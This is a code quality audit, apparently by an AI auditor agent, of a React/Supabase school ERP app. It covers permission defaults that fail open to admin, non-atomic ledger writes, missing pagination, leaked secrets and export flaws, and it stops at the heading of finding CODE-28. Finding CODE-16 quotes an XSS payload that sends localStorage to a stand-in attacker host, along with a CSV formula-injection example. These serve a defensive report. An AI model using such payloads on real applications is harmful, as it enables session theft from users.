# Code quality audit: React app (`src/`)

Auditor: code-quality-auditor. Scope: `src/**`, `public/sw.js `, `package.json`, plus a read of `supabase/security.sql` and `schema.sql` only where needed to judge client behaviour. No source files were modified.

## How this was done

- Read all of: `firebase.js`, `hooks/*`, `context/*`, `utils/*`, `lib/*`, `App.js`, Import, Fees (whole), Payslips (1-330), Users (1-450), Expenses (1-260), Payments (1-150), Students (1-150), Trash (1-110), Dashboard, Reports, BankCash, StudentLedger, AccountDetail, Login, QuickPayment, QuickAdd, Layout, Settings, ReminderLogs, Journals, ChartOfAccounts, AccessOverview, Branches (partial). UI-only JSX in the remaining ~40% of the large pages was skimmed, not read line by line.
- `npm install` succeeded (896 packages). `CI=true react-scripts build` -> "Compiled successfully", 0 warnings reported. That is misleading, see CODE-40. Running ESLint with `eslint-config-react-app` directly gave **7 errors, 17 warnings**.
- Side effect to know about: `npm install` created `/home/user/school-erp/node_modules/` (untracked; the repo has no `.gitignore`, see CODE-44). The build output was written to the scratchpad, not the repo.
- Nothing was run against a live Supabase project, so DB-behaviour claims are marked `Verified: no` where they depend on PostgREST/RLS runtime behaviour.

## Summary

| Severity | Count |
|---|---|
| Critical | 0 |
| High | 12 |
| Medium | 24 |
| Low | 10 |
| Info | 1 |
| Total | 47 |

Top five to fix first: CODE-01 (permissions fail open to admin), CODE-09/10/12/13/14 (money flows that are non-atomic, skip the ledger, or can double-post), CODE-15 (PIN login is broken and falls through), CODE-16 (XSS in the PDF export), CODE-28 (Import mis-maps columns).

---

## A. Correctness: auth, permissions, context

### [CODE-01] Permission resolution fails open to admin
- Severity: High
- Effort: S
- Location: `src/context/UserContext.jsx:136-160`, `:187-188`
- Evidence: No profile row -> `setUserProfile({... role: "admin" ...})` with comment "First user / no profile — default to admin". The error callback does the same ("On error default to admin so app doesn't break"). `const role = userProfile?.role || "admin"` and `basePermissions = PERMISSIONS[role] || customRolePerms[role] || PERMISSIONS.admin`. `customRolePerms` is loaded by a second, independent `onSnapshot` (`:166`) that has no loading flag, so for a user with a custom role there is a window where `customRolePerms[role]` is `undefined` and the app grants full admin permissions until it arrives. A deleted custom role (or a role id typo) also resolves to admin.
- Impact: Any authenticated user whose `users` row is missing (see CODE-23: "Remove user" only deletes the profile row, not the auth account), whose profile fetch errors (network blip, RLS), or who holds a custom role, sees the full admin UI (Users, Import, Trash, all routes). RLS (`current_role()` returns `'none'`) should still block the data, but the UI is wrong and any write that RLS permits for "no role" is exposed. Fix must not rely on RLS alone for defence in depth.
- Fix: Default to a no-access role (`role: "none"`, empty permissions) on missing profile/error and show an "access not configured" screen. Make `loadingProfile` also wait for the first `customRoles` snapshot. Unknown role -> `{}` not `PERMISSIONS.admin`. Bootstrapping the first admin should be a server-side step, not a client default.
- Verified: yes (traced)

### [CODE-21] Branch scoping is inconsistent and `assignedBranchId` is dead
- Severity: Medium
- Effort: M
- Location: `src/pages/Fees.jsx:91`, `src/pages/Expenses.jsx:64`, `src/context/UserContext.jsx:207`, `src/components/Layout/Navbar.jsx:22`, `src/context/BranchContext.jsx:16-18`
- Evidence: Dashboard, Payslips and `useCollection` use `matchesBranch()` (which maps `"main"` to rows with empty `branchId`). Fees and Expenses use `activeBranch === "all" || inv.branchId === activeBranch`, so choosing "Main Office" (`value="main"`) shows no invoices or expenses, because main-office rows have `branchId ""`. Reports, Journals, BankCash, AccountDetail, StudentLedger apply no branch filter at all. `assignedBranchId` is computed in `UserContext` and never read anywhere (`grep assignedBranchId` -> only the definition). The Navbar branch picker lists every branch for every role, and `activeBranch` is restored from `localStorage` without validating it against the user's branch or the branch list.
- Impact: "Main Office" view of Fees/Expenses is empty (looks like data loss). A branch manager is shown a selector for branches they cannot read; a stale `activeBranch` pointing at a deleted branch gives permanently empty lists with no hint.
- Fix: Use `matchesBranch` everywhere (or push the branch filter into the query). In `BranchProvider`, validate the stored value against `branches` and the user's `assignedBranchId`, and hide the picker for non-`canViewAllBranches` users.
- Verified: yes

### [CODE-22] Edit/delete/export permission flags are never enforced in the UI
- Severity: Medium
- Effort: M
- Location: `src/context/UserContext.jsx:16-117`, `src/components/ProtectedSection.jsx` (unused), all pages
- Evidence: `grep "can(\"canEdit\|can(\"canDelete\|can(\"canExport"` finds only `QuickAdd.jsx:15-16`. `ProtectedSection` is imported nowhere. Routes only check `canView*`. A role with `canDeleteStudents: false`, `canExport: false` (branch_manager) still sees Delete/Bulk-delete/CSV/PDF buttons. `/trash`, `/settings` and `/activity-log` routes have no `permission` at all, and `Trash.jsx:27` reads `isAdmin` but never uses it.
- Impact: Buttons that fail with an RLS error (or, per CODE-03, appear to succeed). Permission toggles in Users/AccessOverview for edit/delete/export do nothing visible. Any user can open Trash and attempt restore/purge.
- Fix: Wrap action buttons in `ProtectedSection`/`can()`; gate `/trash` on admin or a dedicated permission.
- Verified: yes

### [CODE-15] PIN login is broken and falls through to a fake "success"
- Severity: High
- Effort: S
- Location: `src/pages/Login.jsx:22-28`, `:42-58`
- Evidence: `await signInWithEmailAndPassword(auth, user.email, user.pin + "_zmi_pin")` — neither identifier is imported (ESLint `no-undef` x2). The resulting `ReferenceError` is swallowed by `catch`, which then runs `if (user) { navigate("/"); }` for a user whose PIN matched client-side. `getDocs(collection(db,"users"))` runs on the logged-out login page with no `.catch`; policies are `to authenticated` (security.sql:303), so the call rejects (unhandled) and the PIN list is always empty for anonymous visitors. Also `if (!user) return toast.error(...)` inside `try` returns without `setLoading(false)`, leaving the button disabled.
- Impact: The PIN tab never signs anyone in. If it ever did load users, it would compare the PIN in the browser against a plaintext PIN column (`users.pin`, see COLUMNS) fetched pre-auth. `navigate("/")` without a session is bounced by `PrivateRoute`, so it fails safe, but the feature is dead and the design is unsafe.
- Fix: Delete the PIN tab, or implement it server-side (Edge Function exchanging user+PIN for a session, with hashed PIN and rate limiting). Remove `pin` from client-readable columns.
- Verified: yes (ESLint no-undef; traced)

### [CODE-17] `QuickAdd` calls hooks after an early return
- Severity: Medium
- Effort: S
- Location: `src/components/Layout/QuickAdd.jsx:17-25`
- Evidence: `if (!canStudent && !canEmployee) return null;` precedes five `useState` calls (ESLint `react-hooks/rules-of-hooks` x5).
- Impact: When a user's permissions change while the app is open (admin edits their role/overrides; realtime snapshot updates `userProfile`), the hook count changes between renders and React throws "Rendered more/fewer hooks", unmounting the whole Layout (white screen).
- Fix: Move the early return below all hooks (or split into `QuickAdd` wrapper + `QuickAddInner`).
- Verified: yes

### [CODE-23] Users page: user removal, guards and unhandled errors
- Severity: Medium
- Effort: M
- Location: `src/pages/Users.jsx:153-208`
- Evidence: `handleDeleteUser` is `await deleteDoc(doc(db,"users",id))` -> hard delete of the profile row only; the Supabase auth user remains and can still sign in (and then hits CODE-01). `handleSetPin`, `handleDeleteUser`, `handleSaveCustomRole`, `handleUpdateRole`, `handleDeleteRole` have no try/catch (rejection -> unhandled, no toast, no `logActivity`). PIN validation is `newPin.length < 4` (letters, spaces accepted); PIN stored/compared in plaintext. An admin can change their own role (the edit button is shown for self; only delete is hidden) and nothing prevents removing the last admin. `handleSaveCustomRole` computes `roleId` (`:175`) and never uses it.
- Impact: Orphaned auth accounts; silent failures; lock-out risk if the only admin demotes themself.
- Fix: Delete users via the same Edge Function that creates them (auth + profile); wrap handlers; block self-demotion/last-admin removal; hash PINs server-side.
- Verified: yes

### [CODE-24] `PermissionsEditor` is a component defined inside `Users()`
- Severity: Low
- Effort: S
- Location: `src/pages/Users.jsx:225`
- Evidence: `const PermissionsEditor = ({ value, onChange }) => (...)` is re-created every render, so React unmounts/remounts the whole tree (including inputs and the `ref` callbacks) on every state change in the parent.
- Impact: Lost focus/scroll and wasted renders in the permissions editor.
- Fix: Hoist it to module scope and pass `expandedGroups` as props.
- Verified: yes

### [CODE-34] AccessOverview optimistic update has no rollback
- Severity: Low
- Effort: S
- Location: `src/pages/AccessOverview.jsx:75-85`
- Evidence: `setSelected({ ...selected, pagePermissions: overrides })` then `updateDoc(...)`; the catch only toasts. `overrides` is derived from the possibly stale `selected`, so rapid toggles overwrite each other. The write also hits CODE-04 (wipes the user's other `extra` keys).
- Impact: UI shows a permission as granted that was not saved (until the next realtime snapshot, which also happens to repair it).
- Fix: Revert state in `catch`, or drop the optimistic write and rely on the snapshot; send a JSON-patch style update.
- Verified: yes

### [CODE-42] Auth context edge cases
- Severity: Low
- Effort: S
- Location: `src/context/AuthContext.jsx:19-24`, `src/context/BranchContext.jsx:25-28`
- Evidence: `supabase.auth.getSession().then(...)` has no `.catch`, so a rejected call leaves `loading` true forever (spinner). `logout` does not clear `localStorage.activeBranch`. `BranchProvider` renders `null` instead of children while `loading && user`, and `loading` only becomes false from the snapshot callbacks, so a failing branches query hangs on the error path only if `onError` is not reached (it is, via `setLoading(false)`), but the first paint after login is always blank until branches load.
- Impact: Stuck spinner on storage failure; branch selection leaks to the next user of a shared computer.
- Fix: catch -> `setLoading(false)`; clear `activeBranch` on sign-out; render children with a branches-loading flag.
- Verified: yes

---

## B. `src/firebase.js` Firestore shim

### [CODE-02] No pagination: every read is capped by PostgREST `max-rows` and loads whole tables
- Severity: High
- Effort: L
- Location: `src/firebase.js:365-371` (`getDocs`), `:439-451` (`fullFetch`), `src/hooks/useCollection.js:34-48`; consumers: Dashboard, Reports, Fees, Payslips, BankCash, AccountDetail, StudentLedger, QuickPayment
- Evidence: Every list is `supabase.from(table).select("*")` with no `.range()`/`.limit()` unless the caller used `limit()`. Supabase's default API `max-rows` is 1000, which truncates silently (no error). `useCollection`'s own header comment says "this loads the collection and processes in the browser ... For this app's scale it's the right tradeoff". Dashboard, Reports and BankCash then SUM over those rows.
- Impact: Once `invoices` or `payments` pass ~1000 rows (a few hundred students x 12 months is a single year), totals, balances, "pending", reports and the ledger become silently wrong, and rows that exist are invisible in the UI. Also an N-row payload and an O(N) re-map on every realtime event for every open tab.
- Fix: Short term, paginate inside `getDocs`/`fullFetch` with `.range()` loops until a short page. Medium term, move totals to SQL (views/RPC: `sum(paid_amount) group by month`), and use server-side search/filter/`range` with `count: "exact"` for list pages; make `Pagination` drive the query, not a client slice.
- Verified: no (`max-rows` default not checked on the live project; the lack of any paging code is verified)

### [CODE-03] Writes that match zero rows (RLS or stale id) are reported as success
- Severity: Medium
- Effort: S
- Location: `src/firebase.js:220-239`, `:289-341`
- Evidence: `updateDoc`, `deleteDoc` (soft), `restoreDoc`, `updateDocs`, `deleteDocs`, `restoreDocs` call `.update(...).eq/in("id", ...)` without `.select()` and ignore the affected row count. `updateDocs` returns `ids.length`, not the number actually updated. With RLS, an UPDATE that no policy allows returns no error and 0 rows.
- Impact: A user without edit rights sees "N invoices updated"/"moved to Trash" and an audit-log line for an action that did nothing; or the reverse, a stale selection silently skips rows.
- Fix: Chain `.select("id")` and throw (or return the count) when fewer rows than expected are affected; surface the count in the toast.
- Verified: no (PostgREST semantics, not run live)

### [CODE-04] `updateDoc`/`setDoc` replace the whole `extra` jsonb
- Severity: Medium
- Effort: S
- Location: `src/firebase.js:70-83` (`encode`), `:210-224`; callers `src/pages/AccessOverview.jsx:81`, `src/pages/Users.jsx:188-193`, `src/pages/ChartOfAccounts.jsx:41-57`
- Evidence: `encode()` puts every non-column key into `row.extra = extra`, and `updateDoc` does `.update(row)`, so the whole `extra` column is overwritten with only the keys in this patch. `updateDocs` handles this correctly with a read-merge, `updateDoc` does not. `updateDoc(users/{id}, { pagePermissions })` makes `extra = { pagePermissions }`. `ChartOfAccounts.openEdit` builds the form from 6 fields only, so saving an account drops all other extra keys (anything imported or added later).
- Impact: Silent data loss of any non-column field whenever a partial update touches one extra field. Today limited to users/accounts/custom_roles; any new `updateDoc` with an extra key on invoices (`studentName`, `lineItems`, `month`, `year`, `notes`, ...) would erase them.
- Fix: In `updateDoc`, when `extra` is non-empty either read-merge or use a Postgres RPC `jsonb_set`/`extra || $1`. Better: promote the used keys (`month`, `year`, `studentName`, `lineItems`, `net_pay`, `salary`...) to real columns (also fixes CODE-02's lack of SQL aggregation).
- Verified: yes

### [CODE-05] Realtime cache races, no reconnect handling, unstable ordering
- Severity: Medium
- Effort: M
- Location: `src/firebase.js:396-520`
- Evidence: (a) `fullFetch()` replaces `cache` wholesale; the initial fetch and the debounced reconcile can resolve after newer INSERT/UPDATE events and overwrite them with an older result (no request sequence/version check), and events arriving before the first fetch completes are applied to `[]` and then discarded. (b) `.subscribe()` has no status callback: after `CHANNEL_ERROR`/`TIMED_OUT`/`CLOSED` (laptop sleep, wifi change) nothing refetches, so the cache goes stale until reload. (c) Reconcile only runs when a DELETE arrives without an id (not the case with `REPLICA IDENTITY FULL`), so effectively never. (d) With no `orderBy`, Postgres returns an unspecified order (Firestore returns doc-id order) and new rows are `push`ed to the end; with `orderBy`, the client re-sorts with JS `>`/`<` which treats `null` and mixed types differently from SQL (`null` sorts first/last differently, numeric strings compare as text). (e) `limit(n)` is re-applied after each event, so a DELETE inside a limited window leaves n-1 rows until a manual refetch.
- Impact: Two admins can see different data; a payment recorded just after page load may not appear; lists shuffle between loads.
- Fix: Add a `fetchSeq` guard; handle `subscribe((status) => ...)` by refetching on `SUBSCRIBED` after a drop; add a deterministic default order (`created_at, id`); treat `null` explicitly in the comparator.
- Verified: yes (code path); no (runtime reproduction)

### [CODE-06] Subscription errors are swallowed; empty list is indistinguishable from failure
- Severity: Medium
- Effort: M
- Location: `src/firebase.js:406-410`, `:447-450`; callers: all `onSnapshot` calls in Fees, Payslips, Expenses, Payments (accounts), Journals, ChartOfAccounts, BankCash, AccountDetail, StudentLedger, Users, AccessOverview; `getDocs` in Dashboard (caught), Reports/QuickPayment/Login (not caught)
- Evidence: `useCollection` and Trash pass an error callback that only `console.error`s and sets `loading` false. Most pages pass none, so the shim falls back to `console.error`. `Reports.fetchAll` and `StudentLedger`'s `getDoc(...).then` have no `.catch` (unhandled promise rejection). `Dashboard` wraps `Promise.all` of five tables in one try/catch; if one table is denied the whole dashboard shows zeros with no message.
- Impact: Combined with RLS, a user missing `canViewStudents` (e.g. accountant) gets an empty student dropdown in Fees ("Student not found") with no explanation (see CODE-27). Failures look like "no data".
- Fix: Standardise on a `useCollection`-like hook that exposes `{ rows, loading, error }` and render an error banner; add a global `unhandledrejection` toast during development.
- Verified: yes

### [CODE-07] Shim API gaps and subtle semantic differences
- Severity: Low
- Effort: S
- Location: `src/firebase.js:133-161`, `:164-175`, `:373-381`, `:76`
- Evidence: (1) `query()` builds a fresh `CollectionRef(ref.name)`, so `query(trashCollection(x), ...)` would lose `_trashed` (no caller does it today; `trashCollection` is used bare). (2) Only `orderBy` (last wins) and `limit` are supported; there is no `where`, `startAfter`, `getCountFromServer`, `runTransaction` or `writeBatch`, and unknown clauses are silently ignored rather than throwing. (3) `getDoc` does not filter `deleted_at`, so a soft-deleted student still `exists()` (StudentLedger will render a trashed student). (4) `serverTimestamp()` resolves to the client clock (`new Date().toISOString()`), not the server's, so clock skew changes `createdAt` ordering (Fees sorts on it). (5) Unknown collection names fall through `TABLE_MAP[name] || name` and `COLUMNS[table] || []`, so a typo writes everything into `extra` or fails at runtime. (6) `addDoc` returns `{ id }`, not a `DocumentReference`.
- Impact: Latent bugs for the next developer; wrong `createdAt` on machines with the wrong clock.
- Fix: Throw on unknown clause/collection, use `default now()` columns for `created_at`, and filter `deleted_at` in `getDoc`.
- Verified: yes

### [CODE-08] Bulk helpers: partial failure, URL length, read-modify-write race
- Severity: Medium
- Effort: M
- Location: `src/firebase.js:272-279`, `:289-323`, `:327-362`
- Evidence: `runInChunks` throws after the first failing chunk, so earlier chunks are committed and later ones not, and the caller cannot tell which rows were changed (contrast `utils/bulk.js:runBulk`, which reports per-row). The merge path in `updateDocs` reads `extra` for all ids, then writes per row: a concurrent writer between read and write is overwritten. All bulk operations use `.in("id", ids)` which PostgREST serialises into the query string of a PATCH/DELETE; "Select all N filtered" across pages can send hundreds of 36-char UUIDs.
- Impact: A bulk edit of a few hundred rows can fail on URL length with no rows changed (or half applied on the merge path); lost updates under concurrency.
- Fix: Chunk `ids` into batches of ~100 for every bulk call and aggregate results; implement merge in SQL (`update ... set extra = extra || $1 where id = any($2)`) via RPC.
- Verified: no (URL limit not exercised); yes (partial-failure code path)

### [CODE-09] No transactions: multi-step money writes are not atomic (the shim has no `runTransaction`/`writeBatch`)
- Severity: High
- Effort: L
- Location: `src/utils/accounting.js:101-124` (`reversePayment`), `:128-135`; `src/pages/Fees.jsx:135-159`, `:254-292`, `:313-322`, `:372-391`; `src/pages/Payslips.jsx:69-85`, `:153-170`; `src/pages/Expenses.jsx:136-155`; `src/pages/AccountDetail.jsx:46-55`
- Evidence: Every flow is "write A, then write B": `reversePayment` marks the original `reversed: true` BEFORE inserting the reversal (if the insert fails the original is reversed with no offset and the balance is off); `confirmPay` posts the ledger entry, then updates the invoice (invoice stays `pending` if the second write fails, and a retry posts the money twice); `handleCreate(directPayment)` creates a `paid` invoice then `recordPayment` (failure -> paid invoice with no ledger); `handleDelete` reverses payments then soft-deletes (failure -> reversed payments, live paid invoice); Expenses saves the expense then catches a failed `recordPayment` and then still shows `toast.success("Expense added")`; the account transfer inserts a `cash_out` then a `cash_in` as two separate calls with no try/catch (money vanishes if the second fails), no same-account check, and string amounts.
- Impact: Bank/cash balances drift from invoices/payslips/expenses with no way to detect or repair it from the UI.
- Fix: Implement these as Postgres functions called with `supabase.rpc` (`record_fee_payment(invoice_id, account, amount, date)`, `reverse_payment(id)`, `transfer(from,to,amount)`, `delete_invoice_with_reversal(id)`), each one transaction, with `SELECT ... FOR UPDATE` on the invoice to also fix concurrent double posting (CODE-27).
- Verified: yes (traced for each flow listed)

### [CODE-10] Restoring from Trash does not re-post reversed payments
- Severity: High
- Effort: M
- Location: `src/firebase.js:242-248` (`restoreDoc`), `:344-353`; `src/pages/Trash.jsx:44-51`, `:69-81`; flows in `Fees.jsx:313-322`, `Payslips.jsx:223-231`, `Expenses.jsx:89-97`
- Evidence: Deleting an invoice/payslip/expense calls `reverseSourcePayments` (which inserts offsetting entries) and then soft-deletes. `restoreDoc`/`restoreDocs` only set `deleted_at = null`. Nothing re-creates the cash entry. The restored invoice still says `paid` with `paidAmount` set.
- Impact: Delete -> Restore leaves a paid invoice whose cash was removed from the ledger. Bank balance understated by the amount; "paid" invoice with no `source` payments, and `getSourcePaidTotal` returns 0 so the next "Add payment" request would collect the full amount again.
- Fix: On restore of a source document, either re-post (inverse of reversal) or block restore with a message; better, do not reverse on soft-delete at all and treat Trash as hidden-but-posted, reversing only on "delete forever".
- Verified: yes

### [CODE-11] `StudentLedger` double-counts reversals
- Severity: Medium
- Effort: S
- Location: `src/pages/StudentLedger.jsx:38-41`
- Evidence: `studentPayments.filter(p => !p.reversed).reduce(... cash_in ? +amount : -amount)`. `reversePayment` marks the original `reversed: true` and inserts a reversal row (`type: cash_out`, `reversalOf` set, `reversed` unset). The ledger drops the original but keeps the reversal, so a reversed payment contributes `-amount` instead of 0. `accounting.js:getSourcePaidTotal` excludes both (`!reversed && !reversalOf`), so the two screens disagree.
- Impact: After any invoice payment is reversed the student's balance is overstated by the reversed amount.
- Fix: Use the same predicate as `getSourcePaidTotal` (shared helper), or include both rows (net 0).
- Verified: yes

---

## C. Money flows in pages

### [CODE-12] Fees "Bulk Fee Receive": paid invoices are created without ledger entries, with no error handling
- Severity: High
- Effort: M
- Location: `src/pages/Fees.jsx:172-195`
- Evidence: For each selected student it `addDoc`s an invoice with `status: s.paid ? "paid" : "pending"` and `paidDate: serverTimestamp()` but never calls `recordPayment` and never sets `paidAmount`/`paidAccount`. There is no `try/catch`, no `submitting` guard, and the loop is sequential and unchunked: any rejection aborts mid-way (earlier invoices committed, no toast, unhandled rejection). `Number(s.amount)` is `NaN` for an empty amount (DB error), and nothing prevents creating a duplicate invoice for a student/month that already has one (contrast `handleGenerateRecurring`).
- Impact: Revenue is recorded as "paid" in invoices/Dashboard but never reaches bank balances; Reports use `paidAmount` (0 here) so income is understated while Dashboard (`status==="paid"` x `amount`) shows it. Partial runs create duplicates when the user retries.
- Fix: Reuse the single payment function for `paid` rows (account chosen once per batch), use `runBulk` with a result summary, skip existing student/month pairs, validate amounts > 0.
- Verified: yes

### [CODE-13] QuickPayment (public route): no auth gate, no ledger entry, misleading success
- Severity: High
- Effort: M
- Location: `src/App.js:67`, `src/pages/QuickPayment.jsx:26-30`, `:39-74`, `:97-99`
- Evidence: `/quick-payment` is outside `PrivateRoute`. `getDocs(collection(db,"students"))` has no `.catch`; with `authenticated`-only RLS an anonymous visitor gets a rejected promise and an unusable page, while a logged-in user of any role (even without `canViewStudents`) loads every student with parent phone numbers. Settings tells admins to "Share this link with staff to log fee payments without logging in", which cannot work with the current RLS (or, if RLS is loosened to make it work, exposes all students). `handleSubmit` inserts a `paid` invoice only (no `recordPayment`, no `paidAmount`, no `paidAccount`), so the cash never reaches bank balances. The WhatsApp send is awaited inside the same `try`: its result is ignored, and any thrown error after `addDoc` shows "Error recording payment" even though the invoice exists (retry -> duplicate). The success screen always says "WhatsApp receipt sent to parent ✓" regardless of the result. Amount is not validated (negative/zero), `year` is an unvalidated number, and the default `date` uses UTC (CODE-20).
- Impact: Unreconciled revenue; duplicate invoices on retry; false assurance that parents were notified; PII exposure if made anonymous.
- Fix: Put the route behind `PrivateRoute` with `canEditFees`, search students server-side (`ilike` + `limit 10`), call the shared payment function, use `res.ok` from `sendWhatsAppMessage` to decide the message, and separate "saved" from "notified".
- Verified: yes (traced); the anonymous failure depends on RLS (`security.sql:141-143`)

### [CODE-14] Payslips pay flow has no submit guard (double salary payout)
- Severity: High
- Effort: S
- Location: `src/pages/Payslips.jsx:66-93`, `:181-198`
- Evidence: `confirmPay` has no `submitting` state (Fees has one) and does not re-check `payModal.status`; each click runs `recordPayment(cash_out)` then `updateDoc`. A double click, or two browser tabs/users paying the same payslip, posts two `cash_out` entries. `handleSubmit` (create payslip) has no try/catch/guard either, and `netPay = Number(form.basicSalary) + ...` becomes `NaN` with an empty basic salary.
- Impact: Salary paid twice in the ledger; payslip marked paid once.
- Fix: Disable on submit, re-read the payslip status before posting, and do the post+update in one RPC with `FOR UPDATE` (CODE-09). Validate `netPay` is a finite number.
- Verified: yes

### [CODE-27] Fees page: smaller correctness issues
- Severity: Medium
- Effort: M
- Location: `src/pages/Fees.jsx:75-79`, `:197-217`, `:224-233`, `:235-302`, `:119-120`, `:464-469`
- Evidence: (1) `alreadyPaid` is read once when the modal opens (`getSourcePaidTotal`), so a second cashier paying in between leads to an over-collect: `paidAmount: newPaid` is computed client-side and overwrites. (2) The students snapshot callback calls `setBulkStudents(s.map(...))` on every student change, wiping ticks and typed amounts in an open Bulk modal whenever anyone edits a student (realtime). (3) `handleGenerateRecurring` has no try/catch, runs sequentially, creates `amount: Number(s.monthlyFee)` which is `NaN` for blank fees, and its duplicate check only knows about invoices already in this tab's cache. (4) `sendWhatsAppMessage` results are ignored in create/pay/bulk; only `sendReminder` inspects `res.ok`. (5) Summary cards: "Collected" sums `amount` for `paid` and "Pending" sums `amount` for `pending`; `partial` invoices appear in neither, and the status filter has no `partial` option, though that status is produced by `confirmPay`. (6) Students dropdown/recurring/reminders depend on `students`, which an accountant cannot read (`canViewStudents: false` + RLS), so New Invoice has an empty list and recurring says "No students". (7) The Fees page's own `.sort` parsing of `createdAt` duplicates `utils/dates.toMillis`.
- Impact: Wrong totals, lost UI input, duplicate/NaN invoices, and a broken workflow for the accountant role.
- Fix: Compute totals from `paidAmount`, add `partial` to filters, decouple `bulkStudents` from the live snapshot (init when the modal opens), give the accountant a minimal student lookup (RPC/view returning id, name, grade, fee).
- Verified: yes (1-5, 7); (6) depends on RLS function `has_perm` reading these defaults

### [CODE-18] Renaming an account orphans its ledger
- Severity: High
- Effort: M
- Location: `src/pages/ChartOfAccounts.jsx:41`, `:52-57`; `src/utils/accounting.js:15-55`; `src/pages/BankCash.jsx:22-28`; `src/pages/AccountDetail.jsx:31`
- Evidence: Payments store the account NAME (`account: p.account`), and balances are computed by `payments.filter(p => p.account === accountName)`. The edit form lets `name` be changed and saves it with `updateDoc(..., { ...form })`; nothing updates `payments.account`. Duplicate account names (see `supabase/fix_duplicate_accounts.sql`) also merge two accounts' balances.
- Impact: After renaming "Cash in Hand" the account's history disappears and its balance reverts to the opening balance; new payments post against the new name only.
- Fix: Store `account_id` on payments (migration + backfill) and join on id; until then make `name` read-only after first use and enforce a unique constraint.
- Verified: yes

### [CODE-19] Reports and Dashboard aggregate the wrong period and ignore the branch
- Severity: Medium
- Effort: M
- Location: `src/pages/Reports.jsx:13-49`, `src/pages/Dashboard.jsx:39-53`
- Evidence: `Reports.fetchAll` depends on `[activeBranch]` but never filters by it (`invoices`, `expenses`, `payslips` are summed in full); the P&L is labelled "Current year to date" but sums every year; monthly buckets use `.getMonth()` without the year, so January 2025 and January 2026 are added into one bar. `salaries` sums every payslip's `netPay` whether paid or not, and `expenses` may also include "Salaries" category entries. `Dashboard` collected/pending use invoice `amount` by status (partial excluded; concessions not netted) while Reports uses `paidAmount`, so the two screens show different "collected" figures. `Dashboard` also shows `branches: stats.branches + 1`. `Reports` has no loading state, and `fetchAll` has no try/catch.
- Impact: Branch managers/admins reading per-branch reports get all-branch numbers; multi-year data is merged.
- Fix: One shared aggregation module (ideally SQL views) with explicit period and branch parameters; define "collected" once.
- Verified: yes

### [CODE-20] Local "today" is computed in UTC
- Severity: Medium
- Effort: S
- Location: 12 sites: `grep "toISOString().slice\|toISOString().split"` -> `accounting.js:48,118`, `Fees.jsx:40,67,139,222,610`, `Payslips.jsx:38,108`, `QuickPayment.jsx:21,81`, ...
- Evidence: `new Date().toISOString().slice(0, 10)` yields the UTC date. The app is Rs./+92 oriented (Pakistan, UTC+5): any entry made between 00:00 and 05:00 local time is dated the previous day; in the UK it is wrong 00:00-01:00 during BST. Also `new Date("YYYY-MM-DD")` in `Dashboard`/`Reports`/`Expenses` sorting parses as UTC midnight and `.getMonth()` reads local time.
- Impact: Receipts and ledger rows dated one day early (month-end entries can land in the wrong month).
- Fix: Add `todayLocal()` (`new Date().toLocaleDateString("en-CA")`) to `utils/dates.js` and use it everywhere; unit-test it under `TZ=Asia/Karachi` and `TZ=America/Los_Angeles`.
- Verified: yes

### [CODE-25] Create handlers without try/catch or guards (unhandled rejections, partial bulk inserts)
- Severity: Medium
- Effort: M
- Location: `src/pages/Payments.jsx:85-106`, `:115`; `src/pages/Expenses.jsx:134-175`; `src/pages/Journals.jsx:31-39`, `:55`; `src/pages/Payslips.jsx:181-198`, `:200-221`; `src/pages/Branches.jsx:13-20`; `src/pages/AccountDetail.jsx:44-59`
- Evidence: `await addDoc(...)` outside try/catch -> a DB error becomes an unhandled promise rejection: no toast, and the modal stays open. Bulk entry uses `Promise.all(valid.map(addDoc))`, so a failure leaves a random subset inserted (no rollback) and a retry duplicates them. Empty date strings (`bulkDate = ""`) are sent for `date` columns (`invalid input syntax for type date`). Payments' delete handlers show "Error deleting" without the message. `Branches` enforces "maximum 4 branches" client-side only.
- Impact: Silent failures and duplicate rows.
- Fix: One `useSubmit(fn)` helper (loading flag, try/catch, toast, double-submit guard); do bulk inserts as a single `insert([...rows])` array call (atomic).
- Verified: yes

---

## D. Security-adjacent items found in the client (cross-ref `security-auditor`)

### [CODE-16] Export helpers: HTML injection in PDF export and CSV formula injection
- Severity: High
- Effort: S
- Location: `src/utils/exportUtils.js:17-37` (also `Payslips.jsx:233-241` re-injects `innerHTML`)
- Evidence: `exportToPDF` builds a document with `document.write` and interpolates `${title}`, every header and every `${cell ?? ""}` unescaped, in a same-origin `window.open` window. Cell values are user-entered student/employee names, descriptions, notes (and imported spreadsheet text). `exportToCSV` escapes quotes but does not neutralise cells starting with `=`, `+`, `-`, `@`, and does not quote headers. `w` is not null-checked (popup blockers).
- Impact: A student named `<img src=x onerror=fetch('//evil/'+localStorage...)>` executes in the app origin when an admin exports "Students Report", with access to the Supabase session in `localStorage`. CSV cells such as `=HYPERLINK(...)` execute when opened in Excel.
- Fix: Escape HTML (`textContent`/a small `esc()`); prefix CSV cells that start with `= + - @` with `'`; add a UTF-8 BOM; null-check `w`. Prefer a print stylesheet on the current page over `document.write`.
- Verified: yes (traced; not executed in a browser)

### [CODE-26] Secrets and tokens compiled into the browser bundle
- Severity: High
- Effort: M
- Location: `src/utils/whatsapp.js:17-19`, `src/pages/ReminderLogs.jsx:74`, `src/pages/Settings.jsx:11-15`
- Evidence: `REACT_APP_WHATSAPP_TOKEN` (a "permanent access token") and `REACT_APP_CRON_SECRET` (sent as `x-cron-secret`) are read via `process.env.REACT_APP_*`; CRA inlines every `REACT_APP_*` value into the public JS. `fetch("/api/send-reminders")` points at a serverless function that does not exist in this repo (no `api/` directory), and `vercel.json` rewrites everything else to `index.html`, so the call returns HTML and `res.json()` throws -> "Could not reach reminder API".
- Impact: Anyone who opens DevTools can send WhatsApp messages as the school and trigger the reminder job.
- Fix: Move WhatsApp sends behind a Supabase Edge Function / Vercel function that checks the caller's session and role; delete `REACT_APP_CRON_SECRET`; rotate both secrets.
- Verified: yes (code); no (deployed env values not checked)

---

## E. Import flow (`src/pages/Import.jsx`)

### [CODE-28] Column auto-mapping uses substring matching and maps one header to several fields
- Severity: High
- Effort: M
- Location: `src/pages/Import.jsx:170-201`, `TEMPLATES` `:12-149`
